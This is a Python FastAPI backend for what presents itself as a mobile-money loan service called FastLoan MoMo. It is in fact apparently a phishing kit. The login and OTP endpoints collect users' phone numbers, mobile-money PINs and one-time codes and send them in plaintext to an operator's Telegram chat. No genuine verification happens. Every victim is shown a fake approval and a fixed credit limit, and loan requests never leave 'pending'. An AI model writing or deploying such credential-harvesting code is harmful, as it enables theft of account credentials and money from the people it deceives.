import os
import uuid
from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, Field
from fastapi.middleware.cors import CORSMiddleware
import httpx

# Load environment variables
load_dotenv()

app = FastAPI(title="FastLoan MoMo API")

# --- CORS CONFIGURATION ---
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=False, 
    allow_methods=["*"],
    allow_headers=["*"],
)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# In-memory database to store loan statuses
LOAN_REQUESTS = {}

# --- HELPER FUNCTIONS ---
async def send_telegram_message(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️ Telegram token or chat ID missing in environment variables.")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload, timeout=10.0)
            if response.status_code != 200:
                print(f"⚠️ Telegram Error: {response.text}")
        except Exception as e:
            print(f"❌ Failed to connect to Telegram: {e}")

# --- DATA MODELS ---
class LoginRequest(BaseModel):
    phone_number: str
    pin: str

class OTPRequest(BaseModel):
    phone_number: str
    otp_code: str

class LoanRequest(BaseModel):
    phone_number: str
    amount: float = Field(..., gt=0, description="Amount must be greater than zero")
    months: int = Field(..., gt=0, description="Months must be greater than zero")

# --- ENDPOINTS ---

@app.get("/")
async def root():
    """Health check endpoint to keep Render awake and prevent 404s."""
    return {"status": "success", "message": "FastLoan MoMo Backend is running!"}

@app.post("/api/login")
async def login(data: LoginRequest):
    await send_telegram_message(
        f"🔐 <b>New Login Attempt</b>\n"
        f"📱 Phone: {data.phone_number}\n"
        f"🔑 PIN: {data.pin}"
    )
    if len(data.pin) != 5:
        raise HTTPException(status_code=400, detail="PIN must be 5 digits")
    return {"status": "success", "message": "OTP sent"}

@app.post("/api/verify-otp")
async def verify_otp(data: OTPRequest):
    await send_telegram_message(
        f"✅ <b>OTP Verified</b>\n"
        f"📱 Phone: {data.phone_number}\n"
        f"🔢 Code: {data.otp_code}"
    )
    return {"status": "success", "credit_limit": 780000}

@app.post("/api/apply-loan")
async def apply_loan(data: LoanRequest):
    loan_id = str(uuid.uuid4())
    LOAN_REQUESTS[loan_id] = "pending"

    # Send ONLY the loan details to Telegram (No buttons)
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": (
                f"💰 <b>New Loan Application</b>\n\n"
                f"📱 Phone: {data.phone_number}\n"
                f"💵 Amount: {data.amount:,.0f} FCFA\n"
                f"📅 Months: {data.months}\n"
                f"🆔 Loan ID: <code>{loan_id}</code>"
            ),
            "parse_mode": "HTML"
        }
        async with httpx.AsyncClient() as client:
            try:
                await client.post(url, json=payload, timeout=10.0)
            except Exception as e:
                print(f"❌ Failed to send loan to Telegram: {e}")

    return {"status": "pending", "loan_id": loan_id}

@app.get("/api/loan-status/{loan_id}")
async def get_loan_status(loan_id: str):
    if loan_id not in LOAN_REQUESTS:
        raise HTTPException(status_code=404, detail="Loan not found")
    return {"status": LOAN_REQUESTS[loan_id]}